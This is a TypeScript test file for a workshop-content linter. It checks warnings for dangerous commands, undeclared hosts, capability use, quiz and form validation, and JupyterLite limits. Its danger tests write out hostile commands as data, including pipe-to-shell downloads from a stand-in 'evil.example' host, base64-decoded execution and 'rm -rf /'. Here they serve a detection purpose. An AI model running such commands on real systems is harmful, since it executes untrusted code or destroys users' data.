import { parseManifest } from '../format/manifest';
import { parsePage } from '../format/page';
import {
  dangerWarnings,
  hostAllowed,
  mentionsAbsolutePath,
  urlHosts
} from '../lint/danger';
import { lintWorkshop } from '../lint/rules';
import { formatLintMessage } from '../lint/types';

const MANIFEST = `
apiVersion: workshop.educates.dev/v1alpha1
name: demo
title: Demo
capabilities:
  - terminal
  - write-files: [workspace]
  - network: [github.com]
pages: [pages/01.md]
`;

function lint(page: string, manifest = MANIFEST) {
  return lintWorkshop({
    manifest: parseManifest(manifest),
    pages: [parsePage(page, { path: 'pages/01.md', variables: {} })]
  });
}

function rules(page: string, manifest = MANIFEST): string[] {
  return lint(page, manifest).map(message => message.rule);
}

describe('dangerWarnings', () => {
  it('flags the usual suspects', () => {
    const rulesFor = (text: string) => dangerWarnings(text).map(w => w.rule);

    expect(rulesFor('curl -fsSL https://x/y.sh | sh')).toContain(
      'danger-pipe-to-shell'
    );
    expect(rulesFor('wget -qO- https://x/y.sh | sudo bash')).toContain(
      'danger-pipe-to-shell'
    );
    expect(rulesFor('sudo apt install git')).toContain('danger-sudo');
    expect(rulesFor('rm -rf /')).toContain('danger-recursive-delete');
    expect(rulesFor('rm -rf ~/stuff')).toContain('danger-recursive-delete');
    expect(rulesFor('rm -rf demo')).not.toContain('danger-recursive-delete');
    expect(rulesFor('eval "$(ssh-agent)"')).toContain('danger-eval');
    expect(rulesFor('echo aGk= | base64 -d | sh')).toContain(
      'danger-base64-exec'
    );
    expect(rulesFor('ls ~/Downloads')).toContain('danger-home-path');
    expect(rulesFor('git status')).toEqual([]);
  });

  it('finds hosts and absolute paths', () => {
    expect(
      urlHosts(
        'pip install x -i https://pypi.org/simple http://Example.com:8080/a https://pypi.org'
      )
    ).toEqual(['pypi.org', 'example.com']);
    expect(mentionsAbsolutePath('cat /etc/hosts')).toBe(true);
    expect(mentionsAbsolutePath('cat etc/hosts')).toBe(false);
    expect(hostAllowed('api.github.com', ['github.com'])).toBe(true);
    expect(hostAllowed('github.com', ['github.com'])).toBe(true);
    expect(hostAllowed('github.com.evil', ['github.com'])).toBe(false);
    expect(hostAllowed('anything', ['*'])).toBe(true);
  });
});

describe('lintWorkshop', () => {
  it('passes a clean workshop', () => {
    expect(
      lint(`---
title: One
---

\`\`\`{execute}
git status
\`\`\`

\`\`\`{file-write}
:path: notes.txt
hello
\`\`\`
`)
    ).toEqual([]);
  });

  it('reports unknown directives, options and missing bodies', () => {
    const found = rules(`---
title: One
---

\`\`\`{teleport}
\`\`\`

\`\`\`{execute}
:colour: red
git status
\`\`\`

\`\`\`{execute}
\`\`\`
`);

    expect(found).toEqual([
      'unknown-directive',
      'unknown-option',
      'missing-body',
      'unused-capability'
    ]);
  });

  it('reports undeclared and unused capabilities', () => {
    const messages = lint(
      `---
title: One
---

\`\`\`{kernel-execute}
:auto: page-enter
print(1)
\`\`\`
`,
      MANIFEST
    );

    expect(messages.map(message => [message.level, message.rule])).toEqual([
      ['error', 'undeclared-capability'],
      ['error', 'undeclared-capability'],
      ['warning', 'unused-capability'],
      ['warning', 'unused-capability']
    ]);
    expect(messages[0].message).toContain('"kernel-exec"');
    expect(messages[1].message).toContain('"auto-run"');
    expect(formatLintMessage(messages[0])).toBe(
      `workshop.yaml: error: ${messages[0].message}`
    );
  });

  it('warns about dangerous commands, hosts and paths', () => {
    const found = rules(`---
title: One
---

\`\`\`{execute}
curl https://evil.example/x.sh | sh
\`\`\`

\`\`\`{execute}
git clone https://github.com/o/r
\`\`\`

\`\`\`{file-write}
:path: /tmp/notes.txt
hello
\`\`\`

\`\`\`{file-write}
:path: ../notes.txt
hello
\`\`\`
`);

    expect(found).toEqual([
      'danger-pipe-to-shell',
      'undeclared-host',
      'path-outside-workspace',
      'path-outside-workspace'
    ]);
  });

  it('checks chain targets exist', () => {
    const messages = lint(
      `---
title: One
---

\`\`\`{execute}
:cascade: nowhere after 1s
git status
\`\`\`

\`\`\`{execute}
:auto: after:missing
git status
\`\`\`

\`\`\`{execute}
:auto: sometimes
git status
\`\`\`
`,
      MANIFEST.replace('- terminal', '- terminal\n  - auto-run')
    );

    expect(messages.map(message => message.rule)).toEqual([
      'unused-capability',
      'unknown-action-id',
      'unknown-action-id',
      'unknown-auto'
    ]);
    expect(messages[1].line).toBe(5);
  });
});

describe('lintWorkshop checks', () => {
  const CHECKS_MANIFEST = MANIFEST.replace(
    '- terminal',
    '- terminal\n  - kernel-exec'
  );

  function lintPages(pages: Record<string, string>) {
    const manifest = parseManifest(
      CHECKS_MANIFEST.replace(
        'pages: [pages/01.md]',
        `pages: [${Object.keys(pages).join(', ')}]`
      )
    );

    return lintWorkshop({
      manifest,
      pages: Object.entries(pages).map(([path, source]) =>
        parsePage(source, { path, variables: {} })
      )
    }).filter(message => message.level === 'error');
  }

  it('validates verify, quiz and form directives', () => {
    const messages = lintPages({
      'pages/01.md': `---
title: One
---

\`\`\`{verify}
:id: ok
:substrate: contents
exists demo
\`\`\`

\`\`\`{verify}
:id: bad
:trigger: teleport
:substrate: ui
nope
\`\`\`

\`\`\`{quiz}
:id: q
question: x
options: [a]
\`\`\`

\`\`\`{form}
:id: f
- { name: a, type: select }
\`\`\`
`
    });

    expect(messages.map(message => message.rule)).toEqual([
      'invalid-verify',
      'invalid-verify',
      'invalid-quiz',
      'invalid-form'
    ]);
    expect(messages[0].message).toContain('Unknown trigger "teleport"');
    expect(messages[1].message).toContain('Unknown predicate "nope"');
  });

  it('checks requirements name existing checks', () => {
    const messages = lintPages({
      'pages/01.md': `---
title: One
requires: [verify:done, quiz:done, nonsense]
---

\`\`\`{verify}
:id: done
:substrate: contents
exists demo
\`\`\`
`
    });

    expect(messages.map(message => [message.rule, message.message])).toEqual([
      [
        'unknown-requirement',
        'Requirement "quiz:done" names no quiz directive'
      ],
      [
        'invalid-requirement',
        'Requirement "nonsense" should look like verify:<id>, quiz:<id> or form:<id>'
      ]
    ]);
  });

  it('flags variables used before the form that sets them', () => {
    const messages = lintPages({
      'pages/01.md': `---
title: One
---

\`\`\`{execute}
git config user.name "{{ user_name }}"
\`\`\`
`,
      'pages/02.md': `---
title: Two
---

\`\`\`{form}
:id: setup
- { name: user_name }
\`\`\`

\`\`\`{execute}
echo {{ user_name }}
\`\`\`
`
    });

    expect(messages.map(message => [message.rule, message.path])).toEqual([
      ['use-before-form', 'pages/01.md']
    ]);
  });

  it('checks platform variants against the declared platforms', () => {
    const manifest = MANIFEST.replace(
      'pages:',
      'platforms: [linux, windows, lite]\npages:'
    );
    const page = (body: string) => `\`\`\`{execute}\n${body}\n\`\`\`\n`;

    expect(rules(page('ls\n:windows:\ndir'), manifest)).toEqual([
      'unused-capability'
    ]);
    expect(rules(page(':windows:\ndir\n:lite:'), manifest)).toEqual([
      'missing-variant',
      'unused-capability'
    ]);
    expect(rules(page(':windows:\ndir'), MANIFEST)).toEqual([
      'unused-capability'
    ]);
  });

  it('warns about what JupyterLite cannot run', () => {
    const manifest = MANIFEST.replace(
      'pages:',
      'platforms: [linux, lite]\npages:'
    ).replace('  - terminal\n', '  - terminal\n  - kernel-exec\n');
    const execute = (body: string) => `\`\`\`{execute}\n${body}\n\`\`\`\n`;
    const verify = (options: string, body: string) =>
      `\`\`\`{verify}\n${options}\n${body}\n\`\`\`\n`;

    // Syntax cockle lacks is reported unless a lite variant replaces it.
    expect(rules(execute('mkdir x && cd x'), manifest)).toContain(
      'lite-shell-syntax'
    );
    expect(
      rules(execute('mkdir x && cd x\n:lite:\nmkdir x'), manifest)
    ).not.toContain('lite-shell-syntax');
    expect(rules(execute('mkdir x && cd x\n:lite:'), manifest)).not.toContain(
      'lite-shell-syntax'
    );
    expect(
      rules(execute(':when: not lite\nmkdir x && cd x'), manifest)
    ).not.toContain('lite-shell-syntax');

    // Server-only substrates and processes are flagged too.
    expect(rules(verify(':script: check.py', ''), manifest)).toContain(
      'lite-unsupported'
    );
    expect(
      rules(verify(':substrate: shell', 'test -f x || false'), manifest)
    ).toContain('lite-shell-syntax');
    expect(
      rules(verify('', 'import subprocess\nsubprocess.run(["ls"])'), manifest)
    ).toContain('lite-unsupported');
    expect(rules(verify('', 'assert True'), manifest)).not.toContain(
      'lite-unsupported'
    );
  });

  it('requires install-packages for an environment', () => {
    const manifest = MANIFEST.replace(
      'pages:',
      'environment: { requirements: requirements.txt }\npages:'
    );

    expect(rules('# Nothing\n', manifest)).toEqual([
      'undeclared-capability',
      'unused-capability',
      'unused-capability'
    ]);
    expect(
      rules(
        '# Nothing\n',
        manifest.replace('  - terminal', '  - install-packages')
      )
    ).toEqual(['unused-capability']);
  });
});
